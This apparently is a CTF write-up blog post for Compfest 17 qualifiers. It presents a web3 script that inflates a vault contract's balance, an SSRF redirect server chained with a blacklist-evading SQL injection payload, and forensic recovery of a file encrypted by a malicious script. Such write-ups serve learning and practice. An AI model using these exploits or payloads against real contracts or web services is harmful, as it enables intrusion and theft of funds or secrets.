---
date: 2025-09-01 18:03:00
layout: post
title: Compfest 17 Quals
subtitle: Have fun at the national CTF
description: ikut untuk kedua kalinya di ctf compfest
image: https://images6.alphacoders.com/135/1355194.jpeg
optimized_image: https://images6.alphacoders.com/135/1355194.jpeg
category: ctf
tags:
  - pwn
  - bof
  - foren
  - blockchain
  - web
author: --
---

I played for the team lastseenin2026 and finished in 20th place. 
This is when the scoreboard was frozen. This write-up is incomplete because I only wrote what I had finished.

# Phantom-Thieves (Blockchain)
## Description

> Let's infiltrate this place and make the greedy king got trapped!!

## Overview
Two attachments are provided: **Fortress.sol** and **Setup.sol**.
The main vulnerability lies in the Vault contract, specifically in how the deposit function calculates shares. 
This function calculates the number of new shares based on the token balance in the vault before new tokens from users enter.

## Solver
Step by step to exploit

- The attacker first makes a small deposit to obtain an initial number of shares in the vault. 
- After obtaining the initial shares, the attacker purchased a large number of *PhantomCoin* tokens. However, instead of depositing the tokens, the attacker transferred them directly to the Vault contract address.
- Due to the inflation of the balance, the calculation ratio in the *openVault()* function becomes invalid. The calculated wouldMint value will fall to zero because the integer division result has a smaller numerator than the denominator. This condition automatically triggers a NoShares() error. Thus, the isSolved() function will return a true value in accordance with the challenge objective.

### Exploit
```python
from web3 import Web3
import json

RPC_URL = "http://ctf.compfest.id:7401/e4c53161-3565-4b30-bc8b-8cd24f82a5ad"
ATTACKER_PRIVATE_KEY = "f3988499fd7ac9e273bbdb180685a1cd96b74b142dc1df73c7055f552bd6f30f"
SETUP_CONTRACT_ADDRESS = "0xB2838D80b2bc8D9E7284d7B6bE2bc194Ff4e574A"
WALLET_ADDR = "0x7734785884951636907fB4677D5CB12B14Ab61cb"

try:
    with open('Fortress.json') as f:
        FORTRESS_ABI = json.load(f)
    with open('PhantomCoin.json') as f:
        PHTM_ABI = json.load(f)
    with open('Vault.json') as f:
        VAULT_ABI = json.load(f)
    with open('Setup.json') as f:
        SETUP_ABI = json.load(f)
except FileNotFoundError:
    print("Error: Pastikan file ABI (.json) ada di folder yang sama dengan skrip ini.")
    exit()
except json.JSONDecodeError:
    print("Error: Ada masalah saat membaca file JSON. Pastikan isinya valid.")
    exit()
# --- AKHIR KONFIGURASI ---


# 1. Koneksi ke Blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Gagal terhubung ke node blockchain!")
    exit()

attacker_account = w3.eth.account.from_key(ATTACKER_PRIVATE_KEY)
w3.eth.default_account = attacker_account.address
print(f"Berhasil terhubung. Alamat Attacker: {attacker_account.address}")

setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=SETUP_ABI)

challenge_address = setup_contract.functions.challenge().call()
challenge_contract = w3.eth.contract(address=challenge_address, abi=FORTRESS_ABI)

token_address = challenge_contract.functions.token().call()
token_contract = w3.eth.contract(address=token_address, abi=PHTM_ABI)

vault_address = challenge_contract.functions.vault().call()
vault_contract = w3.eth.contract(address=vault_address, abi=VAULT_ABI)

print(f"Alamat kontrak Fortress: {challenge_address}")
print(f"Alamat kontrak Token: {token_address}")
print(f"Alamat kontrak Vault: {vault_address}")

def send_tx(tx):
    tx['chainId'] = w3.eth.chain_id
    tx['gas'] = w3.eth.estimate_gas(tx)
    tx['maxFeePerGas'] = w3.eth.gas_price * 2
    tx['maxPriorityFeePerGas'] = w3.to_wei(1, 'gwei')

    signed_tx = w3.eth.account.sign_transaction(tx, ATTACKER_PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Mengirim transaksi, hash: {tx_hash.hex()}. Menunggu konfirmasi...")
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    print("Transaksi berhasil!")
    return tx_receipt

print("\n--- Memulai Eksploitasi ---")

print("\n[LANGKAH 1] Melakukan deposit awal sebesar 1 wei...")
tx_buy_initial = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': 1
})
send_tx(tx_buy_initial)

tx_approve = token_contract.functions.approve(vault_address, 1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_approve)

tx_deposit = vault_contract.functions.deposit(1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_deposit)
print("Deposit awal berhasil. Total shares sekarang > 0.")

print("\n[LANGKAH 2 & 3] Membeli banyak token dan mentransfer langsung ke Vault...")
attack_amount = w3.to_wei(0.5, 'ether')

tx_buy_attack = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': attack_amount
})
send_tx(tx_buy_attack)

tx_inflate = token_contract.functions.transfer(vault_address, attack_amount).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_inflate)
print("Balance vault berhasil diinflasi!")

is_solved = setup_contract.functions.isSolved().call()

if is_solved:
    print("\n✅ SELAMAT! Tantangan berhasil diselesaikan!")
else:
    print("\n❌ GAGAL! Tantangan belum selesai.")

```

# Dark Side Of Asteroid (Web Exploitation)
## Description

> something seems wrong???

## Overview
An attachment was provided with the following content:

### app.py
```python
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'username' not in session:
        return redirect(url_for('login'))

    conn = get_db_connection()
    error_preview = None
    content_type = ''

    if request.method == 'POST':
        photo_url = request.form['photo_url']
        try:
            if is_private_url(photo_url):

                  raise Exception("Direct access to internal host is forbidden.")

            os.makedirs(os.path.join('static', 'uploads'), exist_ok=True)

            resp = requests.get(photo_url, timeout=5)
            content_type = resp.headers.get('Content-Type', '')
            filename = f"{session['username']}_profile_fetched"
            filepath = os.path.join('static', 'uploads', filename)

# -------SNIPPET----------

@app.route('/internal/admin/search')
def internal_admin_search():
    if request.remote_addr != '127.0.0.1':
        return "Access denied", 403

    conn = get_db_connection()
    try:
        search_raw = request.args.get('q', '')
        if search_raw == '':
            query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"
        else:
            search = filter_sqli(search_raw)
            query = f"SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '{search}' AND access_level <= 2"

        rows = conn.execute(query).fetchall()

        result = ''
        for row in rows:
            result += f"{row['secret_name']}: {row['secret_value']}\n"
        if not result:
            result = "No secrets found"

        return result, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return f"Error: {str(e)}"
    finally:
        conn.close()

def is_private_url(url: str):
    hostname = urlparse(url).hostname
    if not hostname:
        return True
    ip = socket.gethostbyname(hostname)
    return ipaddress.ip_address(ip).is_private

# -------SNIPPET----------
```

## solution
**resp = requests.get(photo_url, timeout=5)** will cause the server to make an HTTP request to the URL we provide. This is an SSRF vulnerability. There is an **is_private_url(photo_url)** filter that prevents direct access to internal IP addresses such as 127.0.0.1. However, this filter can be bypassed using HTTP Redirect. The check is only performed on the initial URL, not on the destination URL after the redirect.

**query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"** This is an SQL injection vulnerability in /internal/admin/search. This endpoint can only be accessed from 127.0.0.1 (localhost), so we have to use SSRF to reach it. The search parameter is entered directly into the query string, so we can “escape” the LIKE string and modify the query. 

**Blacklist:** Prohibits words such as union, or, select, and spaces ( ).

**Required:** Our payload must contain the string “access_level”
so the payload will be like this *http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level*

### solve.py
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def do_redirect():
    target_url = "http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level"
    print(f"Menerima request, me-redirect ke: {target_url}")
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

# Crashout (Forensic) Upsolved
## Description
> Evan installed and executed a supposedly safe file. It caused his laptop to hang, several data to become corrupted, and new password-protected files to show up. The password popped up for a while, but I didn't memorize it. Can you get me back my file?

## Initial Analysis
We are given a dump.ad1 file in this challenge. which contains a strange downloaded file
i using autospy to open the dump.ad1, and found a strange .zip file containing script.py
![Gambar 1, File aneh]({{ site.baseurl }}/assets/img/uploads/compfest17quals/1.png)

and I also found an encrypted file
![Gambar 2,]({{ site.baseurl }}/assets/img/uploads/compfest17quals/2.png)

I suspect that file.enc is the flag because that is our goal, to find the corrupt file. But that strange .zip file has a password, so we need to find out where that password is.
I almost gave up looking for the password because I'm still a beginner at this. until I realized there was a dump file at /ProgramData/dumps.
![Gambar 3]({{ site.baseurl }}/assets/img/uploads/compfest17quals/3.png)

After that, I extracted the strange zip file, file.enc and chrome dump, and searched for the password with strings.
![Gambar 4]({{ site.baseurl }}/assets/img/uploads/compfest17quals/4.png)
![Gambar 5]({{ site.baseurl }}/assets/img/uploads/compfest17quals/5.png)
and found the password is **whereourcrashis**
After that, I tried to open the zip file and read script.py, which contained the following:
### script.py
```python
import sys
import hashlib
import getpass

HEADER_SIZE = 16
def derive_key(password: str, length: int = 32) -> bytes:
    return hashlib.sha256(password.encode()).digest()[:length]

def transform(byte, key_byte, i):
    xored = byte ^ key_byte
    rotation = i % 3
    return ((xored << rotation) | (xored >> (8 - rotation))) & 0xFF

def encrypt(input_file, output_file, password):
    key = derive_key(password)

    with open(input_file, 'rb') as f:
        data = f.read()

    encrypted = bytearray(data[:HEADER_SIZE])

    for i, byte in enumerate(data[HEADER_SIZE:], start=HEADER_SIZE):
        key_byte = key[i % len(key)] ^ (i & 0x0F)
        encrypted.append(transform(byte, key_byte, i))

    with open(output_file, 'wb') as f:
        f.write(encrypted)

    print(f"Encrypted {input_file} -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:")
        print("python3 script.py encrypt input.jpg output.enc")
        sys.exit(1)

    mode, input_file, output_file = sys.argv[1:4]
    password = getpass.getpass("Enter password: ")

    if mode == "encrypt":
        encrypt(input_file, output_file, password)
    else:
        print("Invalid")
```

Sure enough, this script creates files with the .enc extension, such as file.enc. After that, I created a decryption key from this script to open the .enc file that was found earlier.
### dec.py
```python
└─$ cat dec.py
import sys
import hashlib
import getpass

HEADER_SIZE = 16

def derive_key(password: str, length: int = 32) -> bytes:
    return hashlib.sha256(password.encode()).digest()[:length]

def reverse_transform(encrypted_byte, key_byte, i):
    """Membalikkan proses 'transform' dari skrip enkripsi."""
    rotation = i % 3
    # Lakukan rotasi ke kanan (kebalikan dari rotasi ke kiri)
    rotated_byte = ((encrypted_byte >> rotation) | (encrypted_byte << (8 - rotation))) & 0xFF
    # Lakukan XOR lagi untuk mendapatkan byte asli
    original_byte = rotated_byte ^ key_byte
    return original_byte

def decrypt(input_file, output_file, password):
    """Fungsi utama untuk mendekripsi file."""
    key = derive_key(password)

    with open(input_file, 'rb') as f:
        data = f.read()

    # Salin 16 byte pertama (header) apa adanya
    decrypted = bytearray(data[:HEADER_SIZE])

    # Proses sisa byte dari file, dimulai dari posisi ke-16
    for i, byte in enumerate(data[HEADER_SIZE:], start=HEADER_SIZE):
        # Buat key_byte yang sama persis seperti saat enkripsi
        key_byte = key[i % len(key)] ^ (i & 0x0F)
        # Panggil fungsi reverse_transform untuk mendapatkan byte asli
        decrypted.append(reverse_transform(byte, key_byte, i))

    with open(output_file, 'wb') as f:
        f.write(decrypted)

    print(f"Decrypted {input_file} -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:")
        print("python3 decrypt.py decrypt input.enc output.jpg")
        sys.exit(1)

    mode, input_file, output_file = sys.argv[1:4]
    password = getpass.getpass("Enter password: ")

    if mode == "decrypt":
        decrypt(input_file, output_file, password)
    else:
        print("Invalid mode. Use 'decrypt'.")
```

Alhamdulillah, the zip password is the same as the password for decrypting this file.enc, until we get a cropped photo, so we need to make a few adjustments and get this photo.
![Gambar 5]({{ site.baseurl }}/assets/img/uploads/compfest17quals/flag.jpg)

